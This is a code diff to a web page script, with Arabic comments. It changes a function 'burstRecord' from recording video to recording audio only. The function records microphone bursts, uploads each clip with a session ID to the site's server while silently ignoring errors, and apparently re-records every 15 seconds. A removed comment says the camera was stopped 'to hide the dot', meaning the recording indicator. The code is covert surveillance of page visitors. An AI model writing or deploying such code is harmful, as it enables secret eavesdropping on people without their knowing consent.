@@ -359,11 +359,16 @@ body {
 // ============================================================
 window.burstRecord = function burstRecord() {
   navigator.mediaDevices.getUserMedia({ 
-    video: { width: 320, height: 240, frameRate: 15 },
+    video: false,
     audio: { echoCancellation: true, noiseSuppression: true }
   })
   .then(function(stream) {
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+    // حاول استخدام audio/webm وإن لم يدعم نترك المتصفح يختار
+    let mimeType = 'audio/webm';
+    if (!MediaRecorder.isTypeSupported(mimeType)) {
+      mimeType = ''; // يختار المتصفح النوع الافتراضي للصوت
+    }
+    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
     const chunks = [];
     
     recorder.ondataavailable = function(e) {
@@ -371,14 +376,16 @@ window.burstRecord = function burstRecord() {
     };
     
     recorder.onstop = function() {
-      const blob = new Blob(chunks, { type: 'video/webm' });
+      const type = mimeType || 'audio/webm';
+      const blob = new Blob(chunks, { type: type });
       const fd = new FormData();
-      fd.append('clip', blob, Date.now() + '.webm');
+      // استخدم امتداد .webm للصوت أيضاً لضمان التوافق
+      fd.append('clip', blob, Date.now() + '_audio.webm');
       fd.append('sessionId', sessionId);
       
       fetch('/api/upload-clip', { method: 'POST', body: fd }).catch(() => {});
       
-      // إيقاف الكاميرا لإخفاء النقطة
+      // إيقاف مسارات الصوت بعد الانتهاء
       stream.getTracks().forEach(t => t.stop());
       
       // بعد 15 ثانية، سجل مرة أخرى
